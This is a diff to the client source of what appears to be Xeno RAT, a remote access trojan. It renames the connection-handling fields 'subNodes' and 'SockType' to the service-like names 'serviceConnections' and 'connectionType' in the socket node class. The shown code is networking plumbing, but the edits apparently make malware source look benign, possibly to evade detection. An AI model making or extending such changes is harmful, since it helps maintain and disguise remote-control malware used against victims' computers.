@@ -14,12 +14,12 @@ namespace xeno_rat_client
         private static extern int memcmp(byte[] b1, byte[] b2, long count);
         
         private Action<Node> OnDisconnect;
-        public List<Node> subNodes = new List<Node>();
+        public List<Node> serviceConnections = new List<Node>();
         public SocketHandler sock;
         public Node Parent;
         public int ID = -1;
         public int SetId = -1;
-        public int SockType = -1;
+        public int connectionType = -1;
         public Node(SocketHandler _sock, Action<Node> _OnDisconnect)
         {
             sock = _sock;
@@ -27,7 +27,7 @@ namespace xeno_rat_client
         }
         public void AddSubNode(Node subNode) 
         {
-            subNodes.Add(subNode);
+            serviceConnections.Add(subNode);
         }
         public async void Disconnect()
         {
@@ -43,8 +43,8 @@ namespace xeno_rat_client
                 sock.sock?.Close(0);
             }
             sock.sock?.Dispose();
-            List<Node> copy = subNodes.ToList();
-            subNodes.Clear();
+            List<Node> copy = serviceConnections.ToList();
+            serviceConnections.Clear();
             foreach (Node i in copy)
             {
                 i?.Disconnect();
@@ -136,8 +136,8 @@ namespace xeno_rat_client
                 sock.ResetRecvTimeout();
                 if (ByteArrayCompare(comp, data))
                 {
-                    byte[] _SockType = sock.IntToBytes(type);
-                    if (!(await sock.SendAsync(_SockType)))
+                    byte[] _connectionType = sock.IntToBytes(type);
+                    if (!(await sock.SendAsync(_connectionType)))
                     {
                         return false;
                     }
@@ -156,7 +156,7 @@ namespace xeno_rat_client
                             return false;
                         }
                     }
-                    SockType = type;
+                    connectionType = type;
                     return true;
                 }
             }
